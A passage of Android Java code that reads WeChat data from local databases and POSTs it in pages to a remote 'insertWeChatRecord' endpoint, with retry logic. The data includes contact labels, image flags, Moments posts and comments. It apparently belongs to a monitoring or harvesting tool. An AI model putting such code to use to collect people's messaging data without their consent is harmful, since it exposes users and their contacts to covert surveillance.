        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("7");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);

        String url = ConfigWechat.insertWeChatRecord;
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadContactLabelToServer 传输数据成功：【" + response + "】");
                //更新上传成功最新时间错
                if (list.size() > 0) {
                    ContactLabel data = list.get(list.size() - 1);
                    SqlDataUtil.updateTableStamp(TABLE_CONTACT_LABEL, data.createTime);
                }
                countDownLatch.countDown();
                uploadContactLabelToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadContactLabelToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadContactLabelToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadContactLabelToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadContactLabelToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(mContext).add(stringRequest);
    }

    public void uploadImgFlagToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {
        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadImgFlagToServer 结束传输数据 ");
            return;
        }

        RLog.d(TAG, "uploadImgFlagToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;
        final List<ImgFlag> list = ImgFlagHelper.getImgFlagList(contactDb, updateTime, (int) pageStart, (int) pageSize);
        RLog.d(TAG, "uploadImgFlagToServer:" + list.size());
        JsonWrap<ImgFlag> jsonWrap = new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("6");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "开始传输数据【" + json + "】");

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadImgFlagToServer 传输数据成功：【" + response + "】");
                //更新上传成功最新时间错
                if (list.size() > 0) {
                    ImgFlag data = list.get(list.size() - 1);
                    SqlDataUtil.updateTableStamp(TABLE_IMG_FLAG, data.lastupdatetime);
                }
                countDownLatch.countDown();
                uploadImgFlagToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadImgFlagToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadImgFlagToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadImgFlagToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadImgFlagToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(mContext).add(stringRequest);
    }

    public void uploadSnsinfoToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {

        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadSnsinfoToServer 结束传输数据 ");
            return;
        }

        RLog.d(TAG, "uploadSnsinfoToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;

        final List<Snsinfo> list = SnsinfoHelper.getSnsInfoList(snsDb, updateTime, (int) pageStart, (int) pageSize);
        RLog.d(TAG, "uploadSnsinfoToServer:" + list.size());
        final String json = new Gson().toJson(list);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "开始传输数据【" + json + "】");


        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadSnsinfoToServer 传输数据成功：【" + response + "】");
                //更新上传成功最新时间错
                if (list.size() > 0) {
                    Snsinfo data = list.get(list.size() - 1);
                    SqlDataUtil.updateTableStamp(TABLE_SNS_INFO, data.getCreateTime());
                }
                countDownLatch.countDown();
                uploadSnsinfoToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadSnsinfoToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadSnsinfoToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadSnsinfoToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadSnsinfoToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
//        Volley.newRequestQueue(mContext).add(stringRequest);
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
    }


    public void uploadSnscommentToServer(String wxId, final int currentCount, final int totalCount, final int retryCount, final CountDownLatch countDownLatch, final String updateTime) {

        if (currentCount == totalCount) {
            RLog.d(TAG, "uploadSnscommentToServer 结束传输数据 ");
            return;
        }

        RLog.d(TAG, "uploadSnscommentToServer 传输数据 " + currentCount + " = " + totalCount);
        float pageStart = currentCount * pageSize;

        final List<Snscomment> list = SnscommentHelper.getSnscommentList(snsDb, updateTime, (int) pageStart, (int) pageSize);
        RLog.d(TAG, "uploadSnscommentToServer:" + list.size());
        final String json = new Gson().toJson(list);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "uploadSnscommentToServer 开始传输数据【" + json + "】");


        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadSnscommentToServer 传输数据成功：【" + response + "】");
                //更新上传成功最新时间错
                if (list.size() > 0) {
                    Snscomment data = list.get(list.size() - 1);
                    SqlDataUtil.updateTableStamp(TABLE_SNS_COMMENT, data.getCreateTime());
                }
                countDownLatch.countDown();
                uploadSnscommentToServer(wxId, currentCount + 1, totalCount, 0, countDownLatch, updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount = retryCount;
                if (alRetryCount < maxRetryCount) {
                    RLog.d(TAG, "uploadSnscommentToServer 传输数据失败 ：【" + volleyError.getMessage() + "】 当前重新上传次数:" + retryCount + " 最大重新上传次数" + maxRetryCount);
                    uploadSnscommentToServer(wxId, currentCount, totalCount, retryCount + 1, countDownLatch, updateTime);
                } else {
                    RLog.d(TAG, "uploadSnscommentToServer 传输数据失败 ：【" + volleyError.getMessage() + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadSnscommentToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy(5 * 1000,//默认超时时间，应设置一个稍微大点儿的，例如本处的500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//默认最大尝试次数
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        RequestQueueSingle.getInstance(mContext).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(mContext).add(stringRequest);
    }


}
